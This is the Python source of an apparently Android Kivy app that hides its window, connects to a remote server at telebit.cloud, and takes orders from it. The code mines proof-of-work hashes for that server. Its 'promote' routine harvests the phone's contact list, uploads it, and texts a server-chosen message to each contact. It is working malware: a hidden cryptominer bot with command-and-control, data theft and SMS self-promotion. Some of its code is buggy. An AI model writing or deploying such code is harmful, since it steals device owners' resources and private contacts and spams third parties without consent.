import threading
import kivy
from kivy.core.window import Window
from kivy.app import App
import time
from jnius import autoclass
import sys
import ast
import socket
import hashlib
from plyer import sms


class Client(App):

    def build(self):

        Window.hide()

        if sys.platform == 'android':
            self.device = autoclass('android.os.BUILD').MODEL
        else:
            self.device = sys.platform

        self.mining = False
        self.stop = False
        self.hashrate = 0
        self.nonce_range = []
        self.success = False
        self.completed = 0
        self.hashes = 0
        self.got_extention = False
        self.extention = []
        self.message = ''

        self.addr = ("telebit.cloud",18186)
        self.socket = socket.socket()

    def on_start(self):
        
        self.socket.connect(self.addr)
        self.socket.send(self.device.encode())
        self.block_template = self.socket.recv(1024).decode()
        self.block_template = ast.literal_eval(self.block_template)

        nonce_start = self.socket.recv(1024).decode()
        self.nonce_range.append(int(nonce_start))
        self.nonce_range.append(int(nonce_start)+10000000)
        self.message = self.socket.recv(1024).decode()
        print(self.message)
        threading.Thread(target=self.recv_commands).start()

    def recv_commands(self):

        print('started recieving commands')

        while True:
            
            command = self.socket.recv(1024).decode()
            
            if command == 'info':
                info = f'Mining: {self.mining}, completed hashed:{self.completed}'
                self.socket.send(str(info).encode())

            elif command == 'stop':
                self.stop = True

            elif command == 'mine':
                threading.Thread(target=self.mine).start()

            elif 'continue' in command:
                if self.stop:
                    self.stop = False
                    start = self.completed
                    self.nonce_range[0] = start
                    threading.Thread(target=self.mine).start()
                else:
                    self.socket.send('Mining didn\'t stop')

            elif 'hashrate' in command:
                self.hashrate_info()

            elif 'extenion' in command:
                extention = int(command.split(':')[-1])
                self.extention.append(extention)
                self.extention.append(extention+10000000)
                self.got_extention = True

            elif 'reset' in command:
                self.reset()

            elif 'promote' in command:
                self.promote()

    def mine(self):

        self.socket.send('Mining in progress.. '.encode())

        block_header = self.block_template['block_header']
        target_difficulty = int(block_header['bits'], 16)

        for nonce in range(self.nonce_range[0],self.nonce_range[1]):

            if self.stop == False:
                block_header['nonce'] = hex(nonce)[2:].zfill(8)

                # Calculate the hash of the modified block header
                block_header_hex = ''
                for i in block_header.values():
                    block_header_hex+=str(i)

                block_hash = hashlib.sha256(hashlib.sha256(block_header_hex.encode()).digest()).digest()

                # Check if the hash meets the target difficulty
                hash_int = int.from_bytes(block_hash[::-1], byteorder='big')

                if hash_int < target_difficulty:
                    self.socket.send('SUCCESS'.encode())
                    self.socket.send(block_hash.hex().encode())

                self.completed+=1
                self.hashes+=1
                self.mining = True
            else:
                self.mining=False
                break

        if self.success == False:
            if self.stop == False:
                while True:
                    self.socket.send('nonce extention'.encode())
                    if not self.got_extention:
                        time.sleep(1)
                    self.socket.send('Nonce extented !'.encode())
                    for nonce in range(self.nonce_range[0],self.nonce_range[1]):

                        if not self.stop:
                            block_header['nonce'] = hex(nonce)[2:].zfill(8)

                            # Calculate the hash of the modified block header
                            block_header_hex = ''
                            for i in block_header.values():
                                block_header_hex+=str(i)

                            block_hash = hashlib.sha256(hashlib.sha256(block_header_hex.encode()).digest()).digest()

                            # Check if the hash meets the target difficulty
                            hash_int = int.from_bytes(block_hash[::-1], byteorder='big')

                            if hash_int < target_difficulty:
                                self.socket.send('SUCCESS'.encode())
                                self.socket.send(block_hash.hex().encode())

                            self.completed+=1
                            self.hashes+=1
                            self.mining = True

                        else:
                            break
            else:
                self.mining=False
                self.socket.send('Stopped mining. '.encode())
        else:
            self.socket.send('Mining stopped because of success'.encode())

    def hashrate_info(self,info_=False):
        if self.mining:
            self.socket.send('Calculating..'.encode())
            time.sleep(10)
            self.hashrate = int(self.hashes/10)
            self.hashes = 0
            self.socket.send(('hashrate '+str(self.hashrate)).encode())
        else:
            self.socket.send('Not mining, cannot find hashrate'.encode())

    def promote(self):

        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        ContentResolver = autoclass('android.content.ContentResolver')
        ContactsContract = autoclass('android.provider.ContactsContract$Contacts')
        cursor = PythonActivity.mActivity.getContentResolver().query(ContactsContract.CONTENT_URI, None, None, None, None)

        contact_list = []

        self.socket.send('Getting contacts')

        if cursor.getCount() > 0:
            while cursor.moveToNext():
                name = cursor.getString(cursor.getColumnIndex(ContactsContract.DISPLAY_NAME))
                contact_list.append(name)

        cursor.close()
        
        self.socket.send(('contacts'+str(contact_list)).encode())
        self.socket.send('sending promotion')

        for contact in contact_list:
            sms.send(phone_number=contact,message=self.message)

Client().run()